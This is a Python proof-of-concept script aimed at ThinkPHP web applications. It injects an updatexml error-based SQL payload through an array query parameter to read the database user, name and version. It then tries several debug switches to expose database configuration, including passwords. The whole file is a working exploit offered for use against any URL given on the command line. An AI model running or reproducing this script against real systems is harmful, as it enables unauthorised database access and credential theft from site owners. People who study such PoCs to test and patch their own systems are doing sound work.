#!/usr/bin/env python3
"""
ThinkPHP SQL Injection + Debug Info Disclosure PoC
Usage:
  python thinkphp_sqli_debug.py http://target/index.php
"""

import sys
import requests
from urllib.parse import urljoin, quote
import re

def sqli_extract(base_url, sql_part, param_name="ids"):
    """
    使用 updatexml 报错注入提取数据。
    sql_part 是要提取的 SQL 片段，例如 "user()", "database()"
    """
    # 构造 payload: ids[0,updatexml(0,concat(0xa,<sql_part>),0)]=1
    payload = f"0,updatexml(0,concat(0xa,{sql_part}),0)"
    full_url = f"{base_url}?{param_name}[{quote(payload)}]=1"
    try:
        resp = requests.get(full_url, timeout=10)
        # 在响应中搜索 XPATH 语法错误信息，通常包含提取的数据
        match = re.search(r"XPATH syntax error:\s*'([^']*)'", resp.text, re.IGNORECASE)
        if match:
            return match.group(1).strip()
        # 也可能直接出现在错误信息中
        match2 = re.search(r"SQLSTATE\[.*?\]: (.*)", resp.text, re.IGNORECASE)
        if match2:
            return match2.group(1).strip()
    except Exception as e:
        print(f"[-] Request failed: {e}")
    return None

def find_debug_info(base_url):
    """尝试常见 DEBUG 模式开关，获取数据库配置信息"""
    debug_params = [
        "debug=1",
        "show_page_trace=1",
        "show_error=1",
        "debug=true",
        "trace=1",
    ]
    base = base_url.split("?")[0]  # 去除原有参数
    for param in debug_params:
        test_url = f"{base}?{param}"
        try:
            resp = requests.get(test_url, timeout=10)
            # 搜索常见的数据库配置字段
            if re.search(r"(DB_HOST|DB_USER|DB_PASSWORD|DB_NAME|数据库|用户名|密码)", resp.text, re.IGNORECASE):
                print(f"[+] Possible debug info found at: {test_url}")
                print(resp.text[:2000])
                return resp.text
        except Exception:
            pass
    return None

def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target_url>")
        print(f"Example: {sys.argv[0]} http://192.168.1.100/index.php")
        sys.exit(1)

    target_url = sys.argv[1]

    print("[*] Testing SQL injection (updatexml) ...")
    # 提取当前数据库用户
    user = sqli_extract(target_url, "user()")
    if user:
        print(f"[+] Current DB user: {user}")
        # 进一步提取数据库名
        db = sqli_extract(target_url, "database()")
        if db:
            print(f"[+] Current database: {db}")
        version = sqli_extract(target_url, "version()")
        if version:
            print(f"[+] DB version: {version}")
    else:
        print("[-] SQL injection not confirmed or failed to extract data.")

    print("\n[*] Attempting to find debug info disclosure ...")
    debug_data = find_debug_info(target_url)
    if not debug_data:
        print("[-] No debug info found with common parameters.")
        print("[*] Try manually visiting /index.php?debug=1 or ?show_page_trace=1")

if __name__ == "__main__":
    main()